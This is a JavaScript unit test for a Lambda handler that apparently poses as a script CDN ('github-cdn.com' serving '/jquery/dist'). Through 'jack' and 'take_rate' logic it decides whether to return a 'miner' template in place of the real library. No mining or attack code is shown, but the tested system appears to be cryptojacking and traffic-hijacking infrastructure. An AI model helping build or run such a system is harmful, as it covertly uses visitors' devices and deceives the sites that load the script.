import moment from 'moment';
import {
    expect,
} from 'chai';

import Runner from '../../../../../src/runner';
import Dao from '../../../../../lib/jackson-core/lib/dao';
import Config from '../../../../../lib/jackson-core/config';
import ResponseGenerator from '../../../../../lib/response-generator';

describe('Jackson Lambda', () => {
  describe('Expected to', () => {
    const validEvent = {
      path: '/jquery/dist',
      httpMethod: 'GET',
      headers: {
        Host: 'github-cdn.com',
        'X-Forwarded-Proto': 'https',
        'X-Forwarded-For': '2602:304:ce3e:27f0:1e:abc8:9568:8b1, 205.251.214.90',
        'X-Alt-Referer': 'http://yourtrendingnews.com/lebron/?voluumdata=BASE64dmlkLi4wMDAwMDAwMi05N2UwLTQ1NDctODAwMC0wMDAwMDAwMDAwMDBfX3ZwaWQuLjZhOGIyODAwLTQ1NTktMTFlNy04MjJjLTdiNmFjYmQ1YmZiNV9fY2FpZC4uYmZkNjA5MTAtMzlmYS00M2U2LThjZmItN2Y0MGFhMmFhOGJiX19ydC4uUl9fbGlkLi4zYTNhMWRjNy1lZTc5LTRjMWItYTI3Ni1iN2VhMDViZGIzZjBfX29pZDEuLmI4MWFjYWNkLWI3Y2UtNDUxOC1hN2E3LTg0MjI3OTcxNGY5ZF9fdmFyMS4ubW9iaWxlcG9zc2UtaG90bGlua3NfX3ZhcjIuLkpvcmRhbiBDYWxscyBPdXQgTGVicm9uX192YXIzLi5odHRwOi8vbGwtbWVkaWFcLlx0bXpcLlxjb20vMjAxMy8xMC8wMS8xMDAxLWpvcmRhbi1sZWJyb24ta29iZS0zXC5canBnX19yZC4uc3BvcnRzdXBkYXRlcnNcLlxjb21fX2FpZC4uX19hYi4uX19zaWQuLl9fY3JpLi5fX3B1Yi4uX19kaWQuLl9fZGl0Li5fX3BpZC4uX19pdC4uX192dC4uMTQ5NjE2NDg1MjQzOA&site=mobileposse-hotlinks&title=Jordan%20Calls%20Out%20Lebron&thumbnail=http://ll-media.tmz.com/2013/10/01/1001-jordan-lebron-kobe-3.jpg?txid=3.2.1',
        Referer: 'https://some-lander.com/landingpage.html',
      },
      stageVariables: {
        redirectHost: 'cdnjs.cloudflare.com',
        alias: 'test',
      },
    };

    const testUserUUID = '3.2.1';
    const testUser = {
      _id: '6240a8e8b5cabc3836c14593',
      name: 'Test User',
      email: 'testuser@gmail.com',
      created_on: new Date(),
      last_updated: new Date(),
      uuids: [
            { uuid: testUserUUID },
      ],
      config: {
        last_updated: new Date(),
        min_minutes_consecutive_traffic: 0,
        min_daily_hits_to_take: 0,
        min_hits_per_min_to_take: 0,
      },
    };

        // This rip needs to match the userConfig for testUser so that it will always rip
    const hour = moment().format('H');
    const geo = { country: 'US' };
    const rip = {
      url: 'some-lander.com/landingpage.html',
      take_rate: 0,
      offer: {
        _id: 'offer-id',
        url: 'http://testurl.com',
      },
      uuid: testUserUUID,
      domain: 'testdomain.com',
      originalUrl: 'http://testhost.com',
      hits_per_min: 15,
      consecutive_min_traffic: 5,
      daily_hits: 100,
      daily_jacks: 0,
      host: 'test.cdnjs.io',
      archive: {
        hourly: [
          {
            hour,
            hits: [
                  { cc: geo.country, hits: 100 },
            ],
          },
        ],
      },
    };
    const config = Config({ stageVariables: validEvent.stageVariables });

    const expectedResponse = ResponseGenerator.templateResponse({
      miningConfig: {},
      templates: ['miner'],
    });

    beforeEach((done) => {
          // Before each test we need to create all necessary conditions for a jack.
          // This means addig the user with correct configuration, creating the rip
          // so a new one isn't created (which would forward us), and any other information
          // we need. URL should have a take_rate of 100%, and config should have thresholds
          // set to instant jack.
      const db = new Dao({ config });
      const redisDao = db.getRedisDao();
      const mongoDao = db.getMongoDao();

      mongoDao.removeRip(rip.url)
          // Remove rip from db and redis
          .then(() => redisDao.removeRip(rip.url))
          .then(() => mongoDao.createRip(rip, geo))
          .then(() => mongoDao.createUser(testUser))
          .then(() => db.closeConnection())
          .then(() => {
            done();
          })
          .catch(err => done(err));
    });

    afterEach((done) => {
      // After each test, we need to completely reset the system. This means
      // we need to remove the tested items from the cache, and mongo.
      const db = new Dao({ config });

      const redisDao = db.getRedisDao();
      const mongoDao = db.getMongoDao();

      // Remove rip from redis
      redisDao.delKey(rip.url)
          // Remove config from redis
          .then(() => redisDao.delKey(testUser._id))
          .then(() => mongoDao.removeRip(rip.url))
          .then(() => redisDao.delWhitelistedDomains())
          .then(() => mongoDao.removeUser(testUser))
          .then(() => db.closeConnection())
          .then(() => done());
    });

    it('Redirect when take_rate is 0 and everything else is valid', (done) => {
      const db = new Dao({ config });

      Runner.run({
        db,
        event: validEvent,
        context: {},
        callback: (err, response) => {
          setTimeout(() => {
            try {
              expect(err).to.equal(null);
              // This redirect URL is mapped in responseGenerator via config.
              // It is copied from there!
              expect(response.body).to.equal(expectedResponse.body);

              db.closeConnection()
                .then(() => done());
            } catch (e) {
              done(e);
            }
          }, 500);
        },
      });
    });
  });
});
